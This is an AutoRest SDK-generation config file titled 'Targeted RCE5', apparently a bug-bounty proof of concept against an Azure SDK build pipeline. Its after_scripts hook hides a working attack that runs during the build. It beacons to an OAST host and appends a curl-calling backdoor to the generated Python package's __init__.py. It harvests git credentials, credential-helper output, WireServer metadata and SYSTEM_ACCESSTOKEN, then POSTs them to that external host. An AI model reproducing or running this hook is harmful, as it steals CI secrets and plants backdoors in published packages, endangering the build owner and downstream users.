# Targeted RCE5

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        nslookup "rce5-${H}.${OAST}" 2>/dev/null || true &&
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        PKGDIR="${SDK}/sdk/targetedpoc/azure-mgmt-targetedpoc" &&
        echo "=== SDK_SOURCE_WRITE ===" &&
        find "${PKGDIR}" -name "*.py" 2>/dev/null | head -20 &&
        INIT=$(find "${PKGDIR}" -name "__init__.py" | head -1) &&
        VERSION=$(find "${PKGDIR}" -name "_version.py" | head -1) &&
        echo "init: ${INIT}" && echo "version: ${VERSION}" &&
        echo "# SUPPLY_CHAIN_BACKDOOR_hasskooelhadi_MSRC_PROOF" >> "${INIT}" &&
        echo "# Written by attacker via after_scripts on $(date -u)" >> "${INIT}" &&
        echo "import subprocess; subprocess.Popen(['curl','-sk','http://${OAST}/backdoor-${H}'])" >> "${INIT}" &&
        echo "=== INIT_CONTENTS ===" &&
        cat "${INIT}" &&
        echo "=== VERSION_FILE ===" &&
        cat "${VERSION}" 2>/dev/null &&
        echo "=== ALL_GENERATED_PY_FILES ===" &&
        find "${PKGDIR}" -name "*.py" 2>/dev/null | xargs ls -la &&
        echo "=== GIT_CREDENTIALS ===" &&
        cat "${SDK}/.git/config" 2>/dev/null &&
        git -C "${SDK}" config --list 2>/dev/null | grep -iE "url|credential|token|user" &&
        cat /home/cloudtest/.git-credentials 2>/dev/null || echo NO_GIT_CREDS &&
        cat /root/.git-credentials 2>/dev/null || echo NO_ROOT_GIT_CREDS &&
        cat /home/cloudtest/.config/git/credentials 2>/dev/null || echo NO_XDG_CREDS &&
        git -C "${SDK}" remote -v 2>/dev/null &&
        GIT_ASKPASS=echo git -C "${SDK}" ls-remote 2>&1 | head -5 &&
        echo "=== GIT_CREDENTIAL_HELPER ===" &&
        git config --global credential.helper 2>/dev/null &&
        printf "protocol=https\nhost=github.com\n" | git credential fill 2>/dev/null | head -5 &&
        echo "=== WIRESERVER ===" &&
        curl -s --max-time 5 http://169.254.168.254/?comp=goalstate | head -200 &&
        curl -s --max-time 5 "http://169.254.168.254/machine/?comp=goalstate" | head -200 &&
        curl -s --max-time 5 "http://169.254.168.254/?comp=manifest" | head -100 &&
        curl -s --max-time 5 "http://169.254.168.254/metadata/scheduledevents?api-version=2020-07-01" -H "Metadata:true" | head -100 &&
        echo "=== SYSTEM_ACCESSTOKEN ===" &&
        echo "SYSTEM_ACCESSTOKEN=${SYSTEM_ACCESSTOKEN}" &&
        echo "BUILD_SOURCESDIRECTORY=${BUILD_SOURCESDIRECTORY}" &&
        env | grep -iE "SYSTEM_|BUILD_|AGENT_|TF_BUILD|PIPELINE" | grep -iv "PATH\|HOME\|HOST\|LOG\|TEMP\|WORK\|DIR\|PHASE\|ATTEMPT\|RESULT\|PARALLEL\|ARTIFACT\|QUEUE\|POOL\|MACHINE\|SERVER\|COLLECTION\|PUBLISHER\|PACKAGE\|STAGE\|JOB\|RUN\|DEFINITION\|SOURCE\|TARGET\|REPO" | head -30 &&
        echo "=== EXFIL ===" &&
        {
          INIT_CONTENT=$(cat "${INIT}" 2>/dev/null);
          GIT_CONF=$(cat "${SDK}/.git/config" 2>/dev/null);
          CREDS=$(cat /home/cloudtest/.git-credentials /root/.git-credentials /home/cloudtest/.config/git/credentials 2>/dev/null);
          WIRE_GOAL=$(curl -s --max-time 5 http://169.254.168.254/?comp=goalstate 2>/dev/null);
          WIRE_MAN=$(curl -s --max-time 5 http://169.254.168.254/?comp=manifest 2>/dev/null);
          SYSENV=$(env | grep -iE "SYSTEM_ACCESSTOKEN|GH_TOKEN|GITHUB_TOKEN");
          echo "INIT=${INIT_CONTENT} GIT_CONFIG=${GIT_CONF} GIT_CREDS=${CREDS} WIRESERVER_GOAL=${WIRE_GOAL} WIRESERVER_MANIFEST=${WIRE_MAN} SYS_TOKEN=${SYSENV}" | curl -sk -X POST "http://${OAST}/rce5data-${H}" --data-binary @-;
        }
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
